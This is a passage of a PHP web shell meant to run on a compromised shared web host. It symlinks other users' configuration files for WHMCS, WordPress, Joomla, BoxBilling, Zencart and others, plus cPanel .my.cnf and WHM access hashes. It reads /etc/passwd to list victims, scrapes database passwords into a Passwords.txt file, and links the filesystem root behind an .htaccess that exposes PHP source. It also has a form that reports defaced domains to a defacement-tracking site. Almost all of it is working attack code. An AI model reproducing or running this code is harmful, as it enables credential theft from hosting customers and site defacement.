@symlink('/home4/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

}

//password grab

function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
{

$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=trim($ar1[0]);
return $ar;
}

$ffile=fopen('Passwords.txt','a+');


$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/cox_symconf/";
$re=$r;
$confi=array("-Wordpress.txt","-Joomla.txt","-WHMCS.txt","-Vbulletin.txt","-Other.txt","-Zencart.txt","-Hostbills.txt","-SMF.txt","-Drupal.txt","-OsCommerce.txt","-MyBB.txt","-PHPBB.txt","-IPB.txt","-BoxBilling.txt");

$users=file("/etc/passwd");
foreach($users as $user)
{

$str=explode(":",$user);
$usersss=$str[0];
foreach($confi as $co)
{


$uurl=$re.$usersss.$co;
$uel=$uurl;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $uel);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
$result['EXE'] = curl_exec($ch);
curl_close($ch);
$uxl=$result['EXE'];


if($uxl && preg_match('/table_prefix/i',$uxl))
{

//Wordpress

$dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
{

//WHMCS

$dbp=entre2v2($uxl,"db_password = '","';");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}


elseif($uxl && preg_match('/dbprefix/i',$uxl))
{

//Joomla

$db=entre2v2($uxl,"password = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/admincpdir/i',$uxl))
{

//Vbulletin

$db=entre2v2($uxl,"password'] = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
{

//Other

$db=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = \"","\";");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}


}
}
echo "<center>
<a href=\"cox_symconf/root/\">Root Server</a>
<br><a href=\"cox_symconf/Passwords.txt\">Passwords</a>
<br><a href=\"cox_symconf/\">Configurations</a></center>";
}
else
{
echo "<center>
<form method=\"POST\">
<textarea name=\"passwd\" class='area' rows='15' cols='60'>";
$file = '/etc/passwd';
$read = @fopen($file, 'r');
if ($read){
$body = @fread($read, @filesize($file));
echo "".htmlentities($body)."";
}
elseif(!$read)
{
$read = @show_source($file) ;
}
elseif(!$read)
{
$read = @highlight_file($file);
}
elseif(!$read)
{
for($uid=0;$uid<1000;$uid++)
{
$ara = posix_getpwuid($uid);
if (!empty($ara))
{
while (list ($key, $val) = each($ara))
{
print "$val:";
}
print "\n";
}}}

flush();
 
echo "</textarea>
<p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
</form></center>";
}
}
}
elseif($_GET['do'] == 'symlink') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("cox_sym",0777);
@chdir("cox_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/cox_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("cox_sym",0777);
@chdir("cox_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/cox_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("cox_sym",0777);@chdir("cox_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/cox_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }    
}
elseif($_GET['do'] == 'defacerid') {
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='coro.id'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='Obsidian Cyber Team'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input type='submit' name='go' value='Submit' style='width: 450px;'>
		</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}

elseif($_GET['do'] == 'config') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("cox_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("cox_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_cox) {
			$user_config_dir = "/home/$user_cox/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
										"/home/$user_cox/.my.cnf" => "cpanel",
					"/home/$user_cox/.accesshash" => "WHM-accesshash",
					"/home/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home/$user_cox/public_html/application/config/database.php" => "Ellislab",					
					"/home/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home/$user_cox/public_html/central/configuration.php" => "WHM Central",
					"/home/$user_cox/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/submitticket.php" => "WHMCS",										
					"/home/$user_cox/public_html/configuration.php" => "Joomla",					
					"/home/$user_cox/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home/$user_cox/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home/$user_cox/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home/$user_cox/public_html/Home/configuration.php" => "JoomlaHome",
					"/home/$user_cox/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home/$user_cox/public_html/home/configuration.php" => "JoomlaHome",
					"/home/$user_cox/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home/$user_cox/public_html/New/configuration.php" => "JoomlaNew",
					"/home/$user_cox/public_html/new/configuration.php" => "JoomlaNew",
					"/home/$user_cox/public_html/News/configuration.php" => "JoomlaNews",
					"/home/$user_cox/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home/$user_cox/public_html/news/configuration.php" => "JoomlaNews",
					"/home/$user_cox/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home/$user_cox/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home/$user_cox/public_html/cms/configuration.php" => "JoomlaCms",
					"/home/$user_cox/public_html/Main/configuration.php" => "JoomlaMain",
					"/home/$user_cox/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home/$user_cox/public_html/main/configuration.php" => "JoomlaMain",
					"/home/$user_cox/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home/$user_cox/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home/$user_cox/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home/$user_cox/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home/$user_cox/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home/$user_cox/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home/$user_cox/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home/$user_cox/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home/$user_cox/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home/$user_cox/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home/$user_cox/public_html/Press/configuration.php" => "JoomlaPress",
					"/home/$user_cox/public_html/press/configuration.php" => "JoomlaPress",
					"/home/$user_cox/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home/$user_cox/public_html/wp/configuration.php" => "JoomlaWp",
					"/home/$user_cox/public_html/WP/configuration.php" => "JoomlaWP",
					"/home/$user_cox/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home/$user_cox/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home/$user_cox/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home/$user_cox/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home/$user_cox/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home/$user_cox/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home/$user_cox/public_html/Home/wp-config.php" => "WordPressHome",
					"/home/$user_cox/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home/$user_cox/public_html/home/wp-config.php" => "WordPressHome",
					"/home/$user_cox/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home/$user_cox/public_html/New/wp-config.php" => "WordPressNew",
					"/home/$user_cox/public_html/new/wp-config.php" => "WordPressNew",
					"/home/$user_cox/public_html/News/wp-config.php" => "WordPressNews",
					"/home/$user_cox/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home/$user_cox/public_html/news/wp-config.php" => "WordPressNews",
					"/home/$user_cox/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home/$user_cox/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home/$user_cox/public_html/cms/wp-config.php" => "WordPressCms",
					"/home/$user_cox/public_html/Main/wp-config.php" => "WordPressMain",
					"/home/$user_cox/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home/$user_cox/public_html/main/wp-config.php" => "WordPressMain",
					"/home/$user_cox/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home/$user_cox/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home/$user_cox/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home/$user_cox/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home/$user_cox/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home/$user_cox/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home/$user_cox/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home/$user_cox/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home/$user_cox/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home/$user_cox/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home/$user_cox/public_html/Press/wp-config.php" => "WordPressPress",
					"/home/$user_cox/public_html/press/wp-config.php" => "WordPressPress",
					"/home/$user_cox/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home/$user_cox/public_html/wp/wp-config.php" => "WordPressWp",
					"/home/$user_cox/public_html/WP/wp-config.php" => "WordPressWP",
					"/home/$user_cox/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home/$user_cox/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home/$user_cox/public_html/Portal/wp-config.php" => "WordPressPortal",
										"/home1/$user_cox/.my.cnf" => "cpanel",
					"/home1/$user_cox/.accesshash" => "WHM-accesshash",
					"/home1/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home1/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home1/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home1/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_cox/public_html/application/config/database.php" => "Ellislab",					
					"/home1/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home1/$user_cox/public_html/central/configuration.php" => "WHM Central",
					"/home1/$user_cox/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/submitticket.php" => "WHMCS",										
					"/home1/$user_cox/public_html/configuration.php" => "Joomla",					
					"/home1/$user_cox/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home1/$user_cox/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home1/$user_cox/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home1/$user_cox/public_html/Home/configuration.php" => "JoomlaHome",
					"/home1/$user_cox/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home1/$user_cox/public_html/home/configuration.php" => "JoomlaHome",
					"/home1/$user_cox/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home1/$user_cox/public_html/New/configuration.php" => "JoomlaNew",
					"/home1/$user_cox/public_html/new/configuration.php" => "JoomlaNew",
					"/home1/$user_cox/public_html/News/configuration.php" => "JoomlaNews",
					"/home1/$user_cox/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home1/$user_cox/public_html/news/configuration.php" => "JoomlaNews",
					"/home1/$user_cox/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home1/$user_cox/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home1/$user_cox/public_html/cms/configuration.php" => "JoomlaCms",
